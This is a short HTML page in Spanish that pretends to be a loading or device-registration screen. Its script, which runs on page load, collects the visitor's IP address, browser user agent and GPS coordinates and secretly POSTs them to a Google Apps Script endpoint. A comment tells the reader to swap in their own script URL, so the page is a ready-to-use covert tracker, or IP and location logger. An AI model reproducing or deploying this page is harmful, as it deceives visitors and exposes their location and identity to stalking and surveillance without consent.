<!DOCTYPE html>
<html>
<head>
    <title>Cargando...</title>
</head>
<body>
    <h1>Procesando solicitud...</h1>
    <script>
        async function capturarDatos() {
            // 1. Obtener IP
            const ipRes = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipRes.json();

            // 2. Obtener Info del Dispositivo
            const device = navigator.userAgent;

            // 3. Intentar obtener ubicación (pide permiso)
            navigator.geolocation.getCurrentPosition(async (pos) => {
                const datos = {
                    ip: ipData.ip,
                    device: device,
                    location: `${pos.coords.latitude}, ${pos.coords.longitude}`,
                    battery: "Consultando..."
                };

                // 4. ENVIAR A GOOGLE SHEETS
                // Reemplaza 'TU_URL_DE_APPS_SCRIPT' con la del Paso 1
                fetch('https://script.google.com/macros/s/AKfycbxBoNhdXNPe8qdEXCwFM6bCnkVkz-BMcrexWfClQzazELI60XWTs6KQlJ4-qNlZYXpknQ/exec', {
                    method: 'POST',
                    mode: 'no-cors',
                    body: JSON.stringify(datos)
                });
                
                alert("¡Gracias por registrar tu dispositivo!");
            });
        }
        capturarDatos();
    </script>
</body>
</html>
